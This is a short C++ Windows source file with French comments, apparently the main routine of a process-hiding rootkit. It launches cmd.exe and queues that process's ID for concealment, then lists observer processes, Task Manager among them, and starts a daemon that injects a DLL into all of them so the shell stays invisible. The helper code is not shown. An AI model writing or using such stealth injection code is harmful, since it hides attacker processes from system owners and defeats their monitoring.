#include "Preparations.h"
#include "Daemon.h"

int _tmain(int argc, _TCHAR* argv[])
{
    // Cr�ation d'un nouveau processus (exemple : calc.exe)
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    wchar_t cmd[] = L"cmd.exe";

    if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        printf("Processus cree : PID = %lu\n", pi.dwProcessId);
        // Ajouter le PID cr�� � la liste des processus � cacher
        argsToDLL.pIDsNum = 0;
        if (argsToDLL.pIDsNum < MAX_PIDS_TO_SEND)
        {
            argsToDLL.pIDs[argsToDLL.pIDsNum] = (int)pi.dwProcessId;
            argsToDLL.pIDsNum++;
        }
        printf("Ciblage pour invisibilite : PID = %lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        printf("�chec de la cr�ation du processus. Code d'erreur : %lu\n", GetLastError());
    }

    // Initialiser la liste des observateurs (inclut Taskmgr.exe) puis lancer le daemon
    initFrobProcList();
    BOOL InjectAll = TRUE;
    LaunchDaemon(InjectAll);

    return 0;
}